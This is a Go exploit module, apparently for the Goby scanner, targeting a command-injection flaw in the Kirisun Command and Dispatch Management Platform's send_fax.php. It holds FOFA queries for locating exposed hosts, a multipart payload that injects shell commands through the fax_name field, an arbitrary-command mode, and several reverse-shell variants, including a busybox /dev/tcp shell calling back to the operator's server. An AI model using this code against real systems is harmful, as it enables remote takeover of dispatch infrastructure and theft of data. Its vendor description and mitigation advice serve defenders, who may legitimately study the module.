package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Fujian Kirisun Communication Command and Dispatch Management Platform /custom/zx/fax/send_fax.php Command Execution Vulnerability",
    "Description": "<p>The Fujian Kirisun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient command, dispatch, and management solutions to help communication operators or related organizations achieve better operational efficiency and service quality. The platform offers powerful command and dispatch functions, enabling real-time monitoring and management of communication network equipment, maintenance personnel, and work tasks. Users can send instructions, dispatch personnel, assign tasks, and receive on-site feedback and reports through the platform. The Fujian Kirisun Communication Command and Dispatch Management Platform's /custom/zx/fax/send_fax.php interface has a command execution vulnerability, allowing attackers to execute arbitrary system commands and gain full control of the system.</p>",
    "Product": "Fujian Kirisun Communication Command and Dispatch Management Platform",
    "Homepage": "https://kirisun.com.cn/",
    "DisclosureDate": "2024-12-31",
    "PostTime": "2025-01-02",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"指挥调度管理平台\" || (body=\"captcha.php?r=echo rand(); ?>\" && body=\"./images/zhanghu.png\")",
    "GobyQuery": "body=\"指挥调度管理平台\" || (body=\"captcha.php?r=echo rand(); ?>\" && body=\"./images/zhanghu.png\")",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands, leading to full system control, potential sensitive data leakage, service disruption, or other severe consequences.</p>",
    "Recommendation": "<p>1. Follow the vendor's official website for timely updates: <a href=\"https://kirisun.com.cn/.\">https://kirisun.com.cn/.</a></p><p>2. Use firewalls or other security devices to set access policies and whitelist access.</p><p>3. Disable public network access to the system unless necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "福建科立讯通信指挥调度管理平台 /custom/zx/fax/send_fax.php 命令执行漏洞",
            "Product": "福建科立讯通信指挥调度管理平台",
            "Description": "<p>福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务，并即时获取现场反馈和报告。福建科立讯通信有限公司指挥调度管理平台/custom/zx/fax/send_fax.php接口存在命令执行漏洞，攻击者可利用该漏洞执行任意系统命令，导致系统被完全控制。</p>",
            "Recommendation": "<p>1. 关注厂商官网，及时关注更新信息：<a href=\"https://kirisun.com.cn/\">https://kirisun.com.cn/</a>。</p><p>2. 通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以通过该漏洞执行任意系统命令，导致系统被完全控制，可能造成敏感数据泄露、服务中断或其他严重后果。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Fujian Kirisun Communication Command and Dispatch Management Platform /custom/zx/fax/send_fax.php Command Execution Vulnerability",
            "Product": "Fujian Kirisun Communication Command and Dispatch Management Platform",
            "Description": "<p>The Fujian Kirisun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient command, dispatch, and management solutions to help communication operators or related organizations achieve better operational efficiency and service quality. The platform offers powerful command and dispatch functions, enabling real-time monitoring and management of communication network equipment, maintenance personnel, and work tasks. Users can send instructions, dispatch personnel, assign tasks, and receive on-site feedback and reports through the platform. The Fujian Kirisun Communication Command and Dispatch Management Platform's /custom/zx/fax/send_fax.php interface has a command execution vulnerability, allowing attackers to execute arbitrary system commands and gain full control of the system.</p>",
            "Recommendation": "<p>1. Follow the vendor's official website for timely updates: <a href=\"https://kirisun.com.cn/.\">https://kirisun.com.cn/.</a></p><p>2. Use firewalls or other security devices to set access policies and whitelist access.</p><p>3. Disable public network access to the system unless necessary.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands, leading to full system control, potential sensitive data leakage, service disruption, or other severe consequences.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9981"
}`

	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string, filename string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		randomName := goutils.RandomHexString(8) + ".php"

		//漏洞url地址
		vulPath := "/custom/zx/fax/send_fax.php"
		postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = "------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"sendfile\";filename=\"" + randomName + "\";\r\nContent-Type: text/plain\r\n\r\n\r\n11111111111111111111\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"fax_extention\"\r\n\r\n\r\n../../../../../..\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"fax_caller_id_name\"\r\n\r\n\r\nfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"fax_caller_id_number\"\r\n\r\n\r\nfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"fax_name\"\r\n\r\n;" + command + ";.pdf\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"

		//请求头
		head := map[string]string{
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}

		//请求1
		response1, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response1 == nil || response1.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}

		// get 请求
		filePath := "/custom/zx/fax/" + filename
		getRequestConfig := httpclient.NewPostRequestConfig(filePath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		getHead := map[string]string{}
		for headName, headValue := range getHead {
			getRequestConfig.Header.Store(headName, headValue)
		}

		// 请求2
		response2, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || response1 == nil || response1.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := response2.RawBody

		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			filename := goutils.RandomHexString(16) + ".txt"

			text := goutils.RandomHexString(16)
			pocCommand := "echo " + text + "| tee " + filename
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand, filename)

			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},

		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				filename := goutils.RandomHexString(16) + ".txt"
				expCommand := "echo `" + command + "` | tee " + filename
				Result, _, err := runPayload(expResult.HostInfo, expCommand, filename)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				filename := goutils.RandomHexString(16) + ".txt"
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command, filename)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
